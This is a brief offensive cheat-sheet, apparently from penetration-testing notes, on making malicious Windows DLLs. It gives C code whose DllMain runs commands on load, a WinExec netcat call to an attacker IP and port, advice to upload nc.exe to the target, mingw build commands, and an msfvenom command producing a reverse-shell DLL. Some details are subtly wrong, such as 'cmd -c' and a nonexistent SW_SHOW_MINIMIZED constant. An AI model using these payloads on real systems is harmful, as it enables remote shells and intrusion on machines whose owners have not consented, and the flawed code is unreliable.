## DLL Payloads without Metasploit
```
#include <windows.h>
int fireLazor()
{
 //WinExec("nc", 0);
 WinExec("cmd \"d:some path\\program.bat\" \"d:\\other path\\file name.ext\"",SW_SHOW_MINIMIZED);
 return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
 fireLazor();
 return 0;
}
```
Upload nc.exe to the remote machine when it doesn't build in.
and
```
WinExec("cmd -c nc.exe <ip-address> <port>",SW_SHOW_MINIMIZED);
```
Compile the code as follows:
```
i686-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
i686-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a
```
---
## Metasploit/MSFVenom
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.X.X LPORT=4444 -f dll -o externalupload.dll
```
